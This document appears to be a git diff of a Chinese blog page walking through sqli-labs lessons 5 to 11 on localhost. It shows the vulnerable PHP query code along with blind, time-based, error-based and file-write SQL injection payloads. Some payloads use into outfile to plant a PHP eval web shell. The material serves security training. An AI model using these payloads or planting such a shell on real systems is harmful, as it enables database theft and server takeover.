-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span></code></pre></div><p>爆数据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39; and if((ascii(substr((select username from users limit 0,1), 1, 1))=68),sleep(5),0)-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 </ul>
 <!-- raw HTML omitted -->
 <ul>
 <li>
 <p><code>benchmark()</code></p>
 <p>爆库名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39; and if((ascii(substr((select schema_name from information_schema.schemata limit 2,1), 1, 1))=115),benchmark(5000000000000000, sha(1),0)-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆表名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span></code></pre></div><p>爆表名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39; and if((ascii(substr((select table_name from information_schema.tables where table_schema=&#34;security&#34; limit 0,1), 1, 1))=101),benchmark(5000000000000000, sha(1),0)-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆列名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span></code></pre></div><p>爆列名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39; and if((ascii(substr((select column_name from information_schema.columns where table_name=&#34;users&#34; limit 0,1), 1, 1))=105),benchmark(5000000000000000, sha(1),0)-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆数据</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span></code></pre></div><p>爆数据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39; and if((ascii(substr((select username from users limit 0,1), 1, 1))=68),benchmark(5000000000000000, sha(1),0)-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 </ul>
 <!-- raw HTML omitted -->
 <ul>
 <li>
 <p>笛卡尔积(heavy query)</p>
 <p>爆库名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39;and ascii(substr((select schema_name from information_schema.schemata limit 0, 1),1,1)) &lt; 80 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆表名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span></code></pre></div><p>爆表名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39;and ascii(substr((select table_name from information_schema.tables where table_schema=&#34;security&#34; limit 0, 1),1,1)) &lt; 80 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆列名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span></code></pre></div><p>爆列名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39;and ascii(substr((select column_name from information_schema.columns where table_name=&#34;users&#34; limit 0, 1),1,1)) &gt; 80 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>爆数据</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span></code></pre></div><p>爆数据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
 </span></span><span class="line"><span class="cl">?id=1&#39;and ascii(substr((select username from users limit 0, 1),1,1)) &lt; 50 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)-- -
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
+</span></span></code></pre></div></li>
 </ul>
 </li>
 </ul>
 <h4 id="lesson-6">lesson 6</h4>
 <p>看源码</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$id</span> <span class="o">=</span> <span class="s1">&#39;&#34;&#39;</span><span class="o">.</span><span class="nv">$id</span><span class="o">.</span><span class="s1">&#39;&#34;&#39;</span><span class="p">;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$id</span> <span class="o">=</span> <span class="s1">&#39;&#34;&#39;</span><span class="o">.</span><span class="nv">$id</span><span class="o">.</span><span class="s1">&#39;&#34;&#39;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE id=</span><span class="si">$id</span><span class="s2"> LIMIT 0,1&#34;</span><span class="p">;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>与lesson 5的区别就在于这里用双引号包裹了id，所以要用&quot;逃逸</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s2">&#34; and updatexml(1,concat(0x7e,database(),0x7e,version(),0x7e),3)-- -
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><h4 id="lesson-7">lesson 7</h4>
+</span></span></code></pre></div><p>与lesson 5的区别就在于这里用双引号包裹了id，所以要用&quot;逃逸</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s2">&#34; and updatexml(1,concat(0x7e,database(),0x7e,version(),0x7e),3)-- -
+</span></span></span></code></pre></div><h4 id="lesson-7">lesson 7</h4>
 <p>看源码,发现是 <code>'))</code> 闭合</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE id=((&#39;</span><span class="si">$id</span><span class="s2">&#39;)) LIMIT 0,1&#34;</span><span class="p">;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE id=((&#39;</span><span class="si">$id</span><span class="s2">&#39;)) LIMIT 0,1&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQLI_BOTH</span><span class="p">);</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>根据题目提示 &ldquo;Use outfile&rdquo;,我们通过写入一句话木马来实现</p>
+</span></span></code></pre></div><p>根据题目提示 &ldquo;Use outfile&rdquo;,我们通过写入一句话木马来实现</p>
 <p>这里有两种思路，一种是把查询的数据通过 <code>into outfile</code> 存放到文件当中，然后直接访问得到查询结果</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;)) union select 1,2,3 into outfile &#34;[absolute path]/test.txt&#34;
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><p>另一种是通过写入一句话木马，然后利用菜刀或者蚁剑进行连接</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;)) union select 1,2,&#39;</span><span class="o">&lt;?</span><span class="n">php</span><span class="w"> </span><span class="o">@</span><span class="n">eval</span><span class="p">(</span><span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="s2">&#34;mima&#34;</span><span class="p">])</span><span class="o">?&gt;</span><span class="s1">&#39; into outfile &#34;[absolute path]/test.php&#34; -- -
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><h4 id="lesson-8">lesson 8</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;)) union select 1,2,3 into outfile &#34;[absolute path]/test.txt&#34;
+</span></span></span></code></pre></div><p>另一种是通过写入一句话木马，然后利用菜刀或者蚁剑进行连接</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;)) union select 1,2,&#39;</span><span class="o">&lt;?</span><span class="n">php</span><span class="w"> </span><span class="o">@</span><span class="n">eval</span><span class="p">(</span><span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="s2">&#34;mima&#34;</span><span class="p">])</span><span class="o">?&gt;</span><span class="s1">&#39; into outfile &#34;[absolute path]/test.php&#34; -- -
+</span></span></span></code></pre></div><h4 id="lesson-8">lesson 8</h4>
 <p>看源码</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE id=&#39;</span><span class="si">$id</span><span class="s2">&#39; LIMIT 0,1&#34;</span><span class="p">;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE id=&#39;</span><span class="si">$id</span><span class="s2">&#39; LIMIT 0,1&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQLI_BOTH</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
@@ -1011,46 +583,11 @@ MySQL server version for the right syntax to use near ””) LIMIT 0,1′ at li
 </span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;font color= &#34;#0000ff&#34; font size= 3&gt;&#39;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>用单引号闭合 <code>'</code> ，但是报错被注视掉了因此考虑使用盲注</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; or if(ascii(substr(database(),1,1))&gt;115,sleep(5), 0)-- -
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><h4 id="lesson-9">lesson 9</h4>
+</span></span></code></pre></div><p>用单引号闭合 <code>'</code> ，但是报错被注视掉了因此考虑使用盲注</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; or if(ascii(substr(database(),1,1))&gt;115,sleep(5), 0)-- -
+</span></span></span></code></pre></div><h4 id="lesson-9">lesson 9</h4>
 <p>看源码</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE id=&#39;</span><span class="si">$id</span><span class="s2">&#39; LIMIT 0,1&#34;</span><span class="p">;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE id=&#39;</span><span class="si">$id</span><span class="s2">&#39; LIMIT 0,1&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQLI_BOTH</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
@@ -1072,47 +609,11 @@ MySQL server version for the right syntax to use near ””) LIMIT 0,1′ at li
 </span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;font color= &#34;#0000ff&#34; font size= 3&gt;&#39;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>发现与less-8基本一致，因此同样适用延时盲注</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; or if(ascii(substr(database(),1,1))&gt;115,sleep(5), 0)-- -
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><h4 id="lesson-10">lesson 10</h4>
+</span></span></code></pre></div><p>发现与less-8基本一致，因此同样适用延时盲注</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; or if(ascii(substr(database(),1,1))&gt;115,sleep(5), 0)-- -
+</span></span></span></code></pre></div><h4 id="lesson-10">lesson 10</h4>
 <p>看源码</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$id</span> <span class="o">=</span> <span class="s1">&#39;&#34;&#39;</span><span class="o">.</span><span class="nv">$id</span><span class="o">.</span><span class="s1">&#39;&#34;&#39;</span><span class="p">;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$id</span> <span class="o">=</span> <span class="s1">&#39;&#34;&#39;</span><span class="o">.</span><span class="nv">$id</span><span class="o">.</span><span class="s1">&#39;&#34;&#39;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE id=</span><span class="si">$id</span><span class="s2"> LIMIT 0,1&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQLI_BOTH</span><span class="p">);</span>
@@ -1135,18 +636,9 @@ MySQL server version for the right syntax to use near ””) LIMIT 0,1′ at li
 </span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;font color= &#34;#0000ff&#34; font size= 3&gt;&#39;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>这里发现对于id进行处理，使用了双引号=&quot;&quot;= 进行包裹，因此修改一下injection payload就可以了，同样也是延时注入</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; or if(ascii(substr(database(),1,1))&gt;115,sleep(5), 0)-- -
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><h4 id="lesson-11">lesson 11</h4>
+</span></span></code></pre></div><p>这里发现对于id进行处理，使用了双引号=&quot;&quot;= 进行包裹，因此修改一下injection payload就可以了，同样也是延时注入</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; or if(ascii(substr(database(),1,1))&gt;115,sleep(5), 0)-- -
+</span></span></span></code></pre></div><h4 id="lesson-11">lesson 11</h4>
 <p>观察源码</p>
 <ol>
 <li>
@@ -1157,60 +649,7 @@ MySQL server version for the right syntax to use near ””) LIMIT 0,1′ at li
 </li>
 </ol>
 <!-- raw HTML omitted -->
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;passwd&#39;</span><span class="p">]))</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;passwd&#39;</span><span class="p">]))</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$uname</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$passwd</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;passwd&#39;</span><span class="p">];</span>
@@ -1259,9 +698,7 @@ MySQL server version for the right syntax to use near ””) LIMIT 0,1′ at li
 </span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;/font&gt;&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>同时使用 <code>1'</code> 查看报错
+</span></span></code></pre></div><p>同时使用 <code>1'</code> 查看报错
 可知需要escape 一个单引号</p>
 <figure><img src="/ox-hugo/2022-04-21_21-42-08_screenshot.png" width="700px"/>
 </figure>
@@ -1270,70 +707,30 @@ MySQL server version for the right syntax to use near ””) LIMIT 0,1′ at li
 <li>文件写入</li>
 </ol>
 <!-- raw HTML omitted -->
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">uname</span><span class="w"> </span><span class="o">=</span><span class="w">  </span><span class="mi">1</span><span class="s1">&#39; union select 1,&#39;</span><span class="o">&lt;?</span><span class="n">php</span><span class="w"> </span><span class="o">@</span><span class="n">eval</span><span class="p">(</span><span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="s2">&#34;mima&#34;</span><span class="p">])</span><span class="o">?&gt;</span><span class="s1">&#39; into outfile &#34;[Absoute path]/test.php&#34;-- -
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">uname</span><span class="w"> </span><span class="o">=</span><span class="w">  </span><span class="mi">1</span><span class="s1">&#39; union select 1,&#39;</span><span class="o">&lt;?</span><span class="n">php</span><span class="w"> </span><span class="o">@</span><span class="n">eval</span><span class="p">(</span><span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="s2">&#34;mima&#34;</span><span class="p">])</span><span class="o">?&gt;</span><span class="s1">&#39; into outfile &#34;[Absoute path]/test.php&#34;-- -
+</span></span></span></code></pre></div><ol>
 <li>报错注入</li>
 </ol>
 <!-- raw HTML omitted -->
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">uname</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="s1">&#39; and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3)-- -
